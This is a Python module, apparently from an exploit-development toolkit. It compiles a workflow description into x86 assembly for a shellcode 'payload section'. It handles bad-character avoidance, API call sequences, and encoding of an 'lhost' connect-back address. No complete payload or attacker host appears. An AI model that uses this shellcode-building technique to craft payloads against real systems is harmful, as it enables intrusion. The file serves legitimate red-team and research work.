"""x86 backend: lower validated Workflow IR to assembly text.

Generates the payload section of the assembly output.  Framework stubs,
module loading, API resolution, string construction, and structure
zeroing are handled by the existing build pipeline; this backend emits
only the executable operations (CallAPI, WriteStructField, Compare,
Jump, Terminate).

All stack references go through StackLayout.slot().ebp_ref so the
existing allocation system owns physical offsets.
"""
from __future__ import annotations

import socket
import struct

from ..api_database import API_DATABASE, STRUCT_DATABASE
from ..encode import (
    encode_dword,
    safe_call_mem,
    safe_dword_store,
    safe_lea,
    safe_mem_load,
    safe_mem_store,
    safe_push_imm,
    safe_word_store,
    encode_word,
)
from ..stack_alloc import StackLayout
from .catalog import get_abi
from .ir import (
    AddressOf,
    AllocateLocal,
    AllocateStruct,
    Block,
    CallAPI,
    Compare,
    ConstructString,
    DefineConstant,
    Immediate,
    Input,
    Jump,
    NameRef,
    SuccessPredicate,
    Terminate,
    TerminateStyle,
    ValueRef,
    Workflow,
    WriteStructField,
    ZeroStruct,
)


def lower_workflow(
    workflow: Workflow,
    layout: StackLayout,
    badchars: set[int],
    config: object | None = None,
) -> str:
    """Lower a validated Workflow IR to x86 assembly text.

    Returns the payload section only.  The caller (WorkflowTemplate.emit
    or compose_asm) is responsible for framework stubs, API resolution,
    string construction, and structure initialization.
    """
    ctx = _LoweringContext(layout, badchars, config)
    lines: list[str] = []

    lines.append(f"; -- Workflow: {workflow.name} --")
    lines.append("")

    for block in workflow.blocks:
        lines.extend(ctx.lower_block(block))

    return "\n".join(lines)


class _LoweringContext:
    """Stateful lowering context for a single workflow."""

    def __init__(
        self,
        layout: StackLayout,
        badchars: set[int],
        config: object | None,
    ) -> None:
        self.layout = layout
        self.bc = badchars
        self.config = config
        self.constants: dict[str, int] = {}

    def lower_block(self, block: Block) -> list[str]:
        lines: list[str] = []
        lines.append(f"wf_{block.name}:")

        for op in block.operations:
            lines.extend(self._lower_op(op))

        lines.append("")
        return lines

    def _lower_op(self, op) -> list[str]:
        if isinstance(op, DefineConstant):
            self.constants[op.name] = op.value
            return [f"    ; const {op.name} = 0x{op.value:x}"]

        if isinstance(op, (ConstructString, AllocateLocal, AllocateStruct)):
            return []

        if isinstance(op, ZeroStruct):
            return []

        if isinstance(op, WriteStructField):
            return self._lower_write_struct_field(op)

        if isinstance(op, CallAPI):
            return self._lower_call(op)

        if isinstance(op, Compare):
            return self._lower_compare(op)

        if isinstance(op, Jump):
            return [f"    jmp  wf_{op.target}"]

        if isinstance(op, Terminate):
            return self._lower_terminate(op)

        return [f"    ; unhandled: {type(op).__name__}"]

    def _resolve_value(self, ref: ValueRef) -> tuple[list[str], str]:
        """Resolve a value ref to (setup_lines, register_or_immediate).

        Returns assembly lines that place the value into eax, and "eax"
        as the resolved operand.  For Immediate(0), returns xor eax,eax.
        """
        if isinstance(ref, Immediate):
            if ref.value == 0:
                return (["    xor  eax, eax"], "eax")
            lines = list(encode_dword(ref.value, self.bc, "eax"))
            return (lines, "eax")

        if isinstance(ref, NameRef):
            name = ref.name
            if name in self.constants:
                val = self.constants[name]
                if val == 0:
                    return (["    xor  eax, eax"], "eax")
                lines = list(encode_dword(val, self.bc, "eax"))
                return (lines, "eax")
            offset = -self.layout.slot(name).offset
            lines = list(safe_mem_load("eax", "ebp", offset, self.bc))
            return (lines, "eax")

        if isinstance(ref, AddressOf):
            offset = -self.layout.slot(ref.name).offset
            lines = list(safe_lea("eax", "ebp", offset, self.bc))
            return (lines, "eax")

        if isinstance(ref, Input):
            return self._resolve_input(ref)

        return ([], "eax")

    def _resolve_input(self, ref: Input) -> tuple[list[str], str]:
        """Resolve a config-derived input to a value in eax."""
        if self.config is None:
            return ([f"    ; WARNING: no config for Input('{ref.name}')"], "eax")

        name = ref.name
        val = getattr(self.config, name, None)
        if val is None:
            return ([f"    ; WARNING: config has no '{name}'"], "eax")

        if isinstance(val, int):
            if val == 0:
                return (["    xor  eax, eax"], "eax")
            lines = list(encode_dword(val, self.bc, "eax"))
            return (lines, "eax")

        if isinstance(val, str):
            if name == "lhost":
                ip_le = struct.unpack("<I", socket.inet_aton(val))[0]
                lines = list(encode_dword(ip_le, self.bc, "eax"))
                return (lines, "eax")
            offset = -self.layout.slot(name).offset
            lines = list(safe_lea("eax", "ebp", offset, self.bc))
            return (lines, "eax")

        return ([f"    ; WARNING: cannot resolve Input('{name}')"], "eax")

    def _lower_call(self, op: CallAPI) -> list[str]:
        """Lower a CallAPI to stdcall push sequence + call."""
        lines: list[str] = []
        api_off = -self.layout.slot(op.api_name).offset

        abi = get_abi(op.api_name)
        arg_names = []
        if abi:
            arg_names = [a.name for a in abi.arguments]

        lines.append("")
        proto = f"{op.api_name}({', '.join(arg_names)})" if arg_names else op.api_name
        lines.append(f"    ; {proto}")

        reversed_args = list(reversed(op.arguments))
        reversed_names = list(reversed(arg_names)) if arg_names else [
            f"arg{i}" for i in range(len(reversed_args) - 1, -1, -1)
        ]

        for arg, name in zip(reversed_args, reversed_names):
            setup, reg = self._resolve_value(arg)
            lines.extend(setup)
            lines.append(f"    push {reg:24s} ; {name}")

        lines.extend(safe_call_mem("ebp", api_off, self.bc))

        if op.result is not None:
            result_off = -self.layout.slot(op.result).offset
            lines.extend(safe_mem_store("ebp", result_off, "eax", self.bc))
            lines.append(f"    ; -> {op.result}")

        return lines

    def _lower_write_struct_field(self, op: WriteStructField) -> list[str]:
        """Lower a WriteStructField to a mov into the struct's field offset."""
        lines: list[str] = []
        struct_off = -self.layout.slot(op.struct_name).offset
        struct_type = None

        for block_op in []:
            pass

        slot = self.layout.slot(op.struct_name)
        stype = slot.name
        for st_name, st_rec in STRUCT_DATABASE.items():
            if st_name == stype or any(
                s.name == stype for s in self.layout.slots_by_category("structure")
            ):
                for f in st_rec.fields:
                    if f.name == op.field_name:
                        struct_type = st_name
                        field_offset = f.offset
                        field_size = f.size
                        break
                if struct_type:
                    break

        if struct_type is None:
            for st_name, st_rec in STRUCT_DATABASE.items():
                for f in st_rec.fields:
                    if f.name == op.field_name:
                        struct_type = st_name
                        field_offset = f.offset
                        field_size = f.size
                        break
                if struct_type:
                    break

        if struct_type is None:
            return [f"    ; ERROR: cannot find field '{op.field_name}'"]

        lines.append(f"    ; {op.struct_name}.{op.field_name}")

        setup, reg = self._resolve_value(op.value)
        lines.extend(setup)

        abs_offset = struct_off + field_offset
        slot_obj = self.layout.slot(op.struct_name)
        struct_base_offset = -(slot_obj.offset - slot_obj.size)
        field_abs = struct_base_offset + field_offset

        if field_size <= 2:
            lines.extend(safe_word_store("ebp", field_abs, reg, self.bc))
        else:
            lines.extend(safe_dword_store("ebp", field_abs, reg, self.bc))

        return lines

    def _lower_compare(self, op: Compare) -> list[str]:
        """Lower a Compare to test/cmp + conditional jump."""
        lines: list[str] = []
        offset = -self.layout.slot(op.value).offset

        lines.extend(safe_mem_load("eax", "ebp", offset, self.bc))

        if op.predicate == SuccessPredicate.NONZERO:
            lines.append("    test eax, eax")
            lines.append(f"    jnz  wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.ZERO:
            lines.append("    test eax, eax")
            lines.append(f"    jz   wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.NULL:
            lines.append("    test eax, eax")
            lines.append(f"    jz   wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.INVALID_HANDLE:
            lines.extend(encode_dword(0xFFFFFFFF, self.bc, "ecx"))
            if 0x3b in self.bc:
                lines.append("    sub  eax, ecx")
            else:
                lines.append("    cmp  eax, ecx")
            lines.append(f"    jne  wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.SIGNED_NEGATIVE:
            lines.append("    test eax, eax")
            lines.append(f"    jns  wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")

        return lines

    def _lower_terminate(self, op: Terminate) -> list[str]:
        if op.style == TerminateStyle.HANG:
            return [
                "wf_hang:",
                "    jmp  wf_hang",
            ]
        return ["    ; unknown terminate style"]
